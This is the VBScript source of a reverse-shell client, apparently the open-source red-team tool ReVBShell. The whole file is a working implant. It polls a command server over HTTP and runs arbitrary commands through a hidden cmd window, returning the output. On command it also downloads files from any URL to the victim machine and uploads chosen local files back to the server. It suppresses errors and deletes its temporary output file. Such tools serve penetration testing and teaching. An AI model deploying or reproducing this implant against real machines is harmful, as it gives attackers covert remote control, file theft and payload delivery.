' this software is provided under under the bsd 3-clause license.
' See the accompanying LICENSE file for more information.
'
' Client for Reverse VBS Shell
'
' Author:
'  Arris Huijgen
'
' Website:
'  https://github.com/bitsadmin/ReVBShell
'

Option Explicit
On Error Resume Next
' General
Dim strResponse, arrResponseText, strRawCommand, strCommand, strArgument, strPostResponse
' Configuration
Dim strHost, strPort, strUrl
' SLEEP
Dim intSleep, strSleep
' SHELL
Dim fs, shell, strOutFile, file, text
' WGET
Dim arrSplitUrl, strFilename, http, stream
' GET
Dim binFileContents

' Instantiate objects
Set shell = CreateObject("WScript.Shell")
Set fs = CreateObject("Scripting.FileSystemObject")
Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest")
If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP")
If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP")

' Configuration
strHost = "127.0.0.1"
strPort = "8080"
intSleep = 5000
strUrl = "http://" & strHost & ":" & strPort

' Periodically poll for commands
While True
    ' Fetch next command
    http.Open "GET", strUrl & "/", False
    http.Send
    strRawCommand = http.ResponseText

    ' Debugging
    'strRawCommand = "SHELL ipconfig"

    ' Determine command and arguments
    arrResponseText = Split(strRawCommand, " ", 2)
    strCommand = arrResponseText(0)
    strArgument = ""
    If UBound(arrResponseText) > 0 Then
        strArgument = arrResponseText(1)
    End If

    strResponse = ""

    ' Execute command
    Select Case strCommand
        ' Sleep X seconds
        Case "NOOP"
            WScript.Sleep intSleep
        
        ' Set sleep time
        Case "SLEEP"
            If strArgument <> "" Then
                intSleep = CInt(strArgument)
                SendStatusUpdate strRawCommand, "Sleep set to " & strArgument & "ms"
            Else
                strSleep = CStr(intSleep)
                SendStatusUpdate strRawCommand, "Sleep is currently set to " & strSleep & "ms"
            End If
        
        ' Execute command
        Case "SHELL"
            'Execute and write to file
            strOutFile = fs.GetSpecialFolder(2) & "\rso.txt"
            shell.Run "cmd /C " & strArgument & "> """ & strOutFile & """ 2>&1", 0, True

            ' Read out file
            Set file = fs.OpenTextFile(strOutfile, 1)
            text = file.ReadAll
            file.Close
            fs.DeleteFile strOutFile, True

            ' Set response
            SendStatusUpdate strRawCommand, text

        ' Download a file from a URL
        Case "WGET"
            ' Determine filename
            arrSplitUrl = Split(strArgument, "/")
            strFilename = arrSplitUrl(UBound(arrSplitUrl))

            ' Fetch file
            Err.Clear() ' Set error number to 0
            http.Open "GET", strArgument, False
            http.Send

            If Err.number <> 0 Then
                SendStatusUpdate strRawCommand, "Error when downloading from " & strArgument & ": " & Err.Description
            Else
                ' Write to file
                Set stream = createobject("Adodb.Stream")
                With stream
                    .Type = 1 'adTypeBinary
                    .Open
                    .Write http.ResponseBody
                    .SaveToFile strFilename, 2 'adSaveCreateOverWrite
                End With

                ' Set response
                SendStatusUpdate strRawCommand, "File download from " & strArgument & "successful."
            End If

        Case "GET"
            ' Only download if file exists
            If fs.FileExists(strArgument) Then
                ' Determine filename
                arrSplitUrl = Split(strArgument, "\")
                strFilename = arrSplitUrl(UBound(arrSplitUrl))

                ' Read the file to memory
                Set stream = CreateObject("Adodb.Stream")
                stream.Type = 1 ' adTypeBinary
                stream.Open
                stream.LoadFromFile strArgument
                binFileContents = stream.Read

                DoHttpBinaryPost "upload", strRawCommand, strFilename, binFileContents
            Else
                SendStatusUpdate strRawCommand, "File does not exist: " & strArgument
            End If
        Case "KILL"
            SendStatusUpdate strRawCommand, "Goodbye!"
            WScript.Quit 0

        Case Else
            SendStatusUpdate strRawCommand, "Unknown command"
    End Select
Wend


Function SendStatusUpdate(strText, strData)
    Dim binData
    binData = StringToBinary(strData)
    DoHttpBinaryPost "cmd", strText, "cmdoutput", binData
End Function


Function DoHttpBinaryPost(strActionType, strText, strFilename, binData)
    ' Compile POST headers and footers
    Const strBoundary = "----WebKitFormBoundaryNiV6OvjHXJPrEdnb"
    Dim binTextHeader, binText, binDataHeader, binFooter, binConcatenated
    binTextHeader = StringToBinary("--" & strBoundary & vbCrLf & _
                                   "Content-Disposition: form-data; name=""cmd""" & vbCrLf & vbCrLf)
    binDataHeader = StringToBinary(vbCrLf & _
                                   "--" & strBoundary & vbCrLf & _
                                   "Content-Disposition: form-data; name=""result""; filename=""" & strFilename & """" & vbCrLf & _
                                   "Content-Type: application/octet-stream" & vbCrLf & vbCrLf)
    binFooter = StringToBinary(vbCrLf & "--" & strBoundary & "--" & vbCrLf)

    ' Convert command to binary
    binText = StringToBinary(strText)

    ' Concatenate POST headers, data elements and footer
    Dim oStream : Set oStream = CreateObject("Adodb.Stream")
    oStream.Open
    oStream.Type = 1 ' adTypeBinary
    oStream.Write binTextHeader
    oStream.Write binText
    oStream.Write binDataHeader
    oStream.Write binData
    oStream.Write binFooter
    oStream.Position = 0
    binConcatenated = oStream.Read(oStream.Size)

    ' Post data
    http.Open "POST", strUrl & "/" & strActionType, False
    http.SetRequestHeader "Content-Length", LenB(binConcatenated)
    http.SetRequestHeader "Content-Type", "multipart/form-data; boundary=" & strBoundary
    http.SetTimeouts 5000, 60000, 60000, 60000
    http.Send binConcatenated
    
    ' Receive response
    DoHttpBinaryPost = http.ResponseText
End Function


Function StringToBinary(Text)
    Dim BinaryStream
    Set BinaryStream = CreateObject("Adodb.Stream")
    BinaryStream.Type = 2 'adTypeText
    BinaryStream.CharSet = "us-ascii"

    ' Store text in stream
    BinaryStream.Open
    BinaryStream.WriteText Text

    ' Change stream type To binary
    BinaryStream.Position = 0
    BinaryStream.Type = 1 'adTypeBinary
  
    ' Return binary data
    StringToBinary = BinaryStream.Read
End Function
